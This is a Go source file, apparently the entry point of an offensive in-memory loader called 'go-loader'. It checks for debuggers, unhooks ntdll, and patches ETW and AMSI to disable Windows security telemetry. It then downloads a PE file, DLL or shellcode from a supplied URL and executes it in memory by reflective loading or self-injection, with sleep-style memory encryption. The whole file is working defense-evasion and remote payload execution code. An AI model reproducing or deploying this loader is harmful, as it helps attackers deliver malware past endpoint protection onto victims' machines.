package main  

import (
	"flag"
	"fmt"
	"log"
	"go-loader/pkg/pe"
	"go-loader/pkg/dll"
	"github.com/carved4/go-native-syscall"
	"go-loader/pkg/net"
	"go-loader/pkg/wrappers"
	"go-loader/pkg/ekko"
	"go-loader/pkg/patch"
	"strings"
	"go-loader/pkg/wincall"
)

func main() {

	patch.CheckDebug()
	wincall.LoadLibraryW("amsi.dll")
	winapi.UnhookNtdll()
	patch.ETW()
	patch.AMSI()

	var (
		uPE       = flag.Bool("pe", false, "Load and execute PE file")
		uSh       = flag.Bool("shellcode", false, "Execute shellcode")
		uDL       = flag.Bool("dll", false, "Load and execute DLL")
		url       = flag.String("url", "", "URL to download the file from (https://server[:port]/filename.exe)")
		fn        = flag.String("func", "", "Function name for DLL execution")
		verbose   = flag.Bool("verbose", false, "Enable verbose output")
	)
	
	flag.Parse()

	flagCount := 0
	if *uPE { flagCount++ }
	if *uSh { flagCount++ }
	if *uDL { flagCount++ }
	
	if flagCount == 0 || *url == "" {
		fmt.Println("Usage: loader [-pe|-shellcode|-dll] -url <URL> [-func <function_name>] [-verbose]")
		fmt.Println()
		fmt.Println("Execution types (choose one):")
		fmt.Println("  -pe:        Load and execute PE file")
		fmt.Println("  -shellcode: Execute shellcode")
		fmt.Println("  -dll:       Load and execute DLL")
		fmt.Println()
		fmt.Println("Required parameters:")
		fmt.Println("  -url:       URL to download the file from, format: https://server[:port]/filename.exe")
		fmt.Println("              The server must be running our chunked encrypted delivery protocol")
		fmt.Println()
		fmt.Println("Optional parameters:")
		fmt.Println("  -func:      Function name for DLL execution (required with -dll)")
		fmt.Println("  -verbose:   Enable verbose output")
		return
	}

	if flagCount > 1 {
		log.Fatalln("[ERROR] Only one execution type can be specified")
	}

	if !strings.HasPrefix(*url, "http://") && !strings.HasPrefix(*url, "https://") {
		log.Fatalln("[ERROR] URL must begin with http:// or https://")
	}

	if *uDL && *fn == "" {
		log.Fatalln("[ERROR] Function name (-func) must be specified when using -dll")
	}

	if *verbose {
		log.Printf("[INFO] Downloading file from: %s\n", *url)
	}
	

	fileBytes, err := net.DownloadFile(*url)
	if err != nil {
		log.Fatalf("[ERROR] Failed to download file: %v\n", err)
	}

	if *verbose {
		log.Printf("[INFO] Download complete, received %d bytes\n", len(fileBytes))
	}


	addr, size, err := net.GetGlobalBufferRegion()
	if err != nil {
		log.Fatalf("[ERROR] Failed to get global buffer region: %v\n", err)
	}


	key, err := ekko.GenerateKey(16)
	if err != nil {
		log.Fatalf("[ERROR] Failed to generate key: %v\n", err)
	}


	if *verbose {
		log.Printf("[INFO] Encrypting memory region at 0x%X (%d bytes)\n", addr, size)
	}
	err = ekko.EncryptMemoryRegion(addr, size, key, 1000)
	if err != nil {
		log.Fatalf("[ERROR] Failed to encrypt memory region: %v\n", err)
	}


	if *verbose {
		log.Printf("[INFO] Decrypting memory region for execution\n")
	}
	err = ekko.EncryptMemoryRegion(addr, size, key, 1000) 
	if err != nil {
		log.Fatalf("[ERROR] Failed to decrypt memory region: %v\n", err)
	}

	if *verbose {
		log.Printf("[INFO] Executing payload...\n")
	}

	
	if *uPE {
		err := pe.LoadPEFromBytes(fileBytes)
		if err != nil {
			log.Fatalf("[ERROR] Failed to load PE: %v\n", err)
		}
		if *verbose {
			log.Printf("[INFO] PE execution complete\n")
		}
		
	} else if *uSh {
		err := wrappers.NtInjectSelfShellcode(fileBytes)
		if err != nil {
			if *verbose {
				log.Printf("[WARN] First shellcode execution attempt failed, retrying...\n")
			}
			err = wrappers.NtInjectSelfShellcode(fileBytes)
			if err != nil {
				log.Fatalf("[ERROR] Failed to execute shellcode: %v\n", err)
			}
		}
		if *verbose {
			log.Printf("[INFO] Shellcode execution initiated\n")
		}
		
	} else if *uDL {
		if *verbose {
			log.Printf("[INFO] Loading DLL and executing function: %s\n", *fn)
		}
		err := dll.LoadDLL(fileBytes, *fn)
		if err != nil {
			log.Fatalf("[ERROR] Failed to load DLL: %v\n", err)
		}
		if *verbose {
			log.Printf("[INFO] DLL execution complete\n")
		}
	}
}